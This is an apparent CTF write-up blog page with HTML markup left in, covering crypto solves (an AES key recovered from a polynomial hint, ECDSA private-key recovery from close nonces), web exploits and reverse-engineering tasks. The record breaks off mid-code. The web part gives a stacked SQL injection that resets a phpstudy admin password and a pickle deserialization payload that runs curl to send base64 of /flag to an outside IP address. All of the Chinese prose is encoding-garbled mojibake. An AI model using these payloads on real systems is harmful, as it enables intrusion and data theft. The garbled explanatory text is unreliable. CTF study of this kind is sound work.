#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># Problem by rec, with nothing.</span></span><br><span class="line"><span class="keyword">import</span> Q</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">enc = cipher.encrypt(pad(secret.flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Q = R(Q.Q)</span><br><span class="line"></span><br><span class="line">t = <span class="number">17</span></span><br><span class="line">pos = random.sample(<span class="built_in">range</span>(<span class="number">600</span>), t) + [<span class="number">600</span>]</span><br><span class="line">poly = [<span class="built_in">int</span>(os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)] + [<span class="built_in">int</span>(key.<span class="built_in">hex</span>(), <span class="number">16</span>)]</span><br><span class="line">hint = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>):</span><br><span class="line">    hint = (hint + poly[i]*x^pos[i]) % Q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pos = &#125;</span>\n<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>å¤šé¡¹å¼ä¸Šçš„æ¨¡è¿ç®—ï¼Œå…ˆç”¨sageæ¨å¯¼å¤šé¡¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pos = [<span class="number">477</span>, <span class="number">491</span>, <span class="number">210</span>, <span class="number">515</span>, <span class="number">150</span>, <span class="number">142</span>, <span class="number">561</span>, <span class="number">5</span>, <span class="number">475</span>, <span class="number">329</span>, <span class="number">598</span>, <span class="number">274</span>, <span class="number">241</span>, <span class="number">310</span>, <span class="number">108</span>, <span class="number">483</span>, <span class="number">181</span>, <span class="number">600</span>]</span><br><span class="line">Q = [...]</span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R = PolynomialRing(GF(p), <span class="string">&#x27;a&#x27;</span>, <span class="number">19</span>)</span><br><span class="line">a = R.gens()</span><br><span class="line">x = a[<span class="number">18</span>]</span><br><span class="line"><span class="comment">#Q = R(Q)</span></span><br><span class="line">Q = ...</span><br><span class="line"></span><br><span class="line">poly = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    poly = (poly + a[i]*x^pos[i]) % Q</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(poly)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°429æ¬¡å¤šé¡¹å¼ï¼Œå°†åŒæ¬¡é¡¹çš„ç³»æ•°å½’ç±»ï¼Œå½¢æˆA/BçŸ©é˜µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outA.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>):</span><br><span class="line">    d.append([])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    x = k[<span class="number">0</span>].strip()</span><br><span class="line">    d[k[<span class="number">1</span>]].append(<span class="built_in">int</span>(x.split(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]) <span class="keyword">if</span> x[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">len</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> d])</span><br><span class="line"><span class="comment"># len=8: a0/1/3/6/8/10/15/17</span></span><br><span class="line"><span class="comment"># len=9: a0/1/3/6/8/10/15/17+another one</span></span><br><span class="line"></span><br><span class="line">A = d[-<span class="number">8</span>:][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outB.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    B.append(k[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">r&#x27;out_final.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;A = <span class="subst">&#123;A&#125;</span>&#x27;</span>,file=g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;B = <span class="subst">&#123;B[:<span class="number">8</span>]&#125;</span>&#x27;</span>,file=g)</span><br></pre></td></tr></table></figure><p>å‘ç°å¤§éƒ¨åˆ†å«8é¡¹çš„ç³»æ•°éƒ½ä¸a0/a1/a3/a6/a8/a10/a15/a17å˜é‡æœ‰å…³ï¼Œé€‰å–8ç»„åŒæ¬¡é¡¹ä¸ç»“æœæ¥åšç³»æ•°å¯¹æ¯”ï¼Œæ±‚è§£çŸ©é˜µæ–¹ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line">A = matrix(Zmod(p), A)</span><br><span class="line">B = vector(Zmod(p), B[:<span class="number">8</span>])</span><br><span class="line">A \ B</span><br><span class="line"></span><br><span class="line"><span class="comment"># (232766905492121523584723111736297361759, 328061273411433237903912759338260875197, 64156810189296343079030126884552967921, 145155918563801313155466268136086691055, 281912772467581204740174686468688405760, 127909413131477378514965968460479471790, 176132068091173488530894527009633409599, 275609957223526193497841020687316070508)</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°key=a17=275609957223526193497841020687316070508ï¼Œè§£AESï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;e086deeb9f060c014867c5adbd1ee1b449193b6e6177f58a36948282e1728f3b529b2def3c39f69c7a9001b4cac4d1d5&#x27;</span></span><br><span class="line">key = long_to_bytes(<span class="number">275609957223526193497841020687316070508</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(enc))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ecdsa"><a href="#ecdsa" class="headerlink" title="ecdsa"></a>ecdsa</h3><blockquote><p>Let me tell you a story about ecdsa.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">gen = <span class="keyword">lambda</span>: p + getPrime(<span class="number">16</span>)</span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + os.urandom(<span class="number">32</span> - <span class="built_in">len</span>(m) % <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">30</span>)</span><br><span class="line">sk = ecdsa.SigningKey.from_secret_exponent(</span><br><span class="line">    secexp=bytes_to_long(key),</span><br><span class="line">    curve=ecdsa.SECP256k1</span><br><span class="line">)</span><br><span class="line">sig1 = sk.sign(data=<span class="string">b&#x27;This is the first message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">sig2 = sk.sign(data=<span class="string">b&#x27;Here is another message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sig1 = &#125;</span>\n<span class="subst">&#123;sig2 = &#125;</span>\n<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line"><span class="string">sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>é€‰å–æ ‡å‡†æ›²çº¿SECP256k1ï¼Œä¸”æŸ¥çœ‹ecdsaåŒ…æºç ï¼Œ<code>sig=r_str+s_str</code>ã€‚</p><p>æ ¹æ®å¼å­ï¼š</p><p>$s_1 \equiv k_1^{-1}(z_1+r_1d) \pmod n,s_2 \equiv k_2^{-1}(z_2+r_2d) \pmod n$</p><p>å·²çŸ¥ $r_1,s_1,r_2,s_2,z_1,z_2$ï¼Œä¸” $k_1-k_2=\Delta k$ å¾ˆå°ï¼Œè”ç«‹ç”¨ $\Delta k$ è¡¨ç¤º $d$ï¼Œå†åˆ†åˆ«çˆ†ç ´ $\Delta k$ å€¼å³å¯å¾—åˆ°æ­£ç¡®çš„ $d$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1,sha512</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line">h1 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;This is the first message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;Here is another message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">sig1 = <span class="string">&#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line">sig2 = <span class="string">&#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> inverse_mod(x,n)</span><br><span class="line"></span><br><span class="line">r1 = <span class="built_in">int</span>(sig1[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s1 = <span class="built_in">int</span>(sig1[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">r2 = <span class="built_in">int</span>(sig2[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(sig2[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> dk <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>^<span class="number">16</span>, <span class="number">2</span>^<span class="number">16</span>):</span><br><span class="line">    x = (dk-(inv(s2)*h2-inv(s1)*h1))*inv(inv(s2)*r2-inv(s1)*r1)%n</span><br><span class="line">    <span class="keyword">if</span> x.nbits()&lt;=<span class="number">30</span>*<span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(dk,x)</span><br><span class="line">        flag = <span class="built_in">int</span>(sha512(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])).hexdigest(), <span class="number">16</span>) ^^ <span class="built_in">int</span>(enc,<span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># -12538 529916052714421365211802626556164022962456609322782019794355446252399179</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\xed\x98\x98\xbc\x92+\xc7\x7f\xe2_\xfd\x17\x1e\x9c\xf7\x17Rq\xfa3\xa2&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>NKCTF 2023 - xiaopi åŸé¢˜ï¼Œå‚è€ƒ <a href="https://blog.csdn.net/weixin_52365980/article/details/129803385ã€‚">https://blog.csdn.net/weixin_52365980/article/details/129803385ã€‚</a></p><p>åœ¨è¯·æ±‚å¤´åŠ  <code>X-Requested-With: XMLHttpRequest</code> å¯ä»¥è¿›å…¥åå°ç™»å½•ç•Œé¢ï¼Œ</p><p>å†å‚è€ƒå°çš®é¢æ¿å‰å°sqlæ³¨å…¥æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œæ„é€ payloadï¼š</p><p><code>admin&#39;;UPDATE ADMINS set PASSWORD = &#39;202cb962ac59075b964b07152d234b70&#39;;--</code></p><p>æ¥ç€ç”¨ <code>admin/123</code> å¯è¿›å…¥åå°ï¼Œåœ¨è®¡åˆ’ä»»åŠ¡ç•Œé¢ç›´æ¥RCEå³å¯è·å–flagã€‚</p><p>â€‹    </p><h3 id="easypy"><a href="#easypy" class="headerlink" title="easypy"></a>easypy</h3><p>æ‰«æå¾—åˆ°ç›®å½• <code>/download</code>ï¼Œè®¿é—®ä¸‹è½½ <code>www.zip</code>ï¼Œé‡Œé¢çœŸæ­£çš„ä»£ç åœ¨ <code>app.cpython-38.pyc</code>ï¼Œåç¼–è¯‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: app.cpython-38.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;å°pæƒ³è¦æ‰¾ä¸€ä¸ªå¥³æœ‹å‹ï¼Œä½ èƒ½å¸®ä»–æ‰¾æ‰¾çœ‹ä¹ˆï¼Ÿ&#x27;</span></span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriends</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        numpydata = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">and</span> <span class="string">b&#x27;bash&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> numpydata:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ä¸èƒ½èµ°æ·å¾„å•Š&#x27;</span></span><br><span class="line">        resp = <span class="literal">None</span>.loads(numpydata)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;å¯ä»¥çš„ï¼Œè¦çš„å°±æ˜¯ä¸€ç§æ„Ÿè§‰&#x27;</span></span><br><span class="line"></span><br><span class="line">girlfriends = app.route(<span class="string">&#x27;/girlfriends&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(girlfriends)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">download = app.route(<span class="string">&#x27;/download&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(download)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°è·¯ç”± <code>/girlfriends?data=</code>ï¼Œéœ€æä¾›opcodeæ¥RCEï¼Œä½†ä¸èƒ½åŒ…å« <code>R</code> å­—ç¬¦ï¼Œå‚è€ƒæ–‡ç« ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>i</code> æˆ– <code>o</code> å­—ç¬¦å®ç°RCEï¼Œè€Œç¦ç”¨äº† <code>sh</code>ï¼Œä¸å¥½å®ç°åå¼¹shellï¼Œç”¨curlå‘½ä»¤å¤–å¸¦flagå€¼åˆ°vpså³å¯ï¼š</p><p>vpsï¼š<code>python3 -m http.server 10010</code></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;curl http://120.25.104.209:10010?`base64 /flag`&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>å¯¹åº”base64ï¼š<code>KFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==</code>ã€‚</p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h3><blockquote><p>æ•°å­—æ¸¸æˆï¼</p></blockquote><p>çœ‹åç¼–è¯‘ä»£ç ç›²çŒœä¸ºæ•°ç‹¬æ¸¸æˆï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°ç‹¬çŸ©é˜µè¿›è¡Œæ±‚è§£ï¼Œå¹¶è¾“å‡ºè§£å¯†åçš„flagåœ¨æ¯ä¸€æ¬¡å¾ªç¯ä¸­ï¼Œè¯»å–ç©å®¶è¾“å…¥çš„æ•°ç‹¬çŸ©é˜µå¹¶å¯»æ‰¾ç©ºç€çš„ä½ç½®ï¼Œæ¥æ”¶åˆ°ä¸€ä¸ªè¾“å…¥æ•°å­—åï¼Œåˆ¤æ–­å…¶æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åˆ™å¡«å……è¿›çŸ©é˜µä¸­ï¼Œå¹¶å¯¹å…¶æ±‚å’Œã€‚å¦‚æœæ±‚è§£æˆåŠŸï¼Œåˆ™è¾“å‡ºflagã€‚</p><p>ä½¿ç”¨åœ¨çº¿æ•°ç‹¬æ±‚è§£å™¨ï¼Œå°†å¡«å…¥æ•°å­—è¿æˆå­—ç¬¦ä¸² <code>468912723481342575971422657913948591537428763345261</code>è¾“å…¥å¾—åˆ°flagï¼š<code>flag&#123;bbcbff5c1f1ded46c25d28119a85c6c2&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="BWBA"><a href="#BWBA" class="headerlink" title="BWBA"></a>BWBA</h3><blockquote><p>ä¸€ä½85å²è€å¤§çˆ·äºä»Šå¹´è€ƒå…¥å¤§å­¦çš„è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ä¸“ä¸šï¼Œåœ¨ç¬¬ä¸€å¹´çš„å­¦ä¹ ä¸­å­¦åˆ°äº†é«˜ç­‰æ•°å­¦ã€ç¦»æ•£æ•°å­¦ã€C++ç­‰ï¼Œä¸‹é¢æ˜¯å¤§çˆ·ç¼–å†™çš„ä¸€é“ç¨‹åºï¼Œè¯·ç ´è§£å¤§çˆ·å†™çš„ç¨‹åº</p></blockquote><p> <code>encrypt()</code> åŠ å¯†å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v7; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+23h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::size(a2);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::allocator(&amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(a1, v9, <span class="number">0LL</span>, &amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 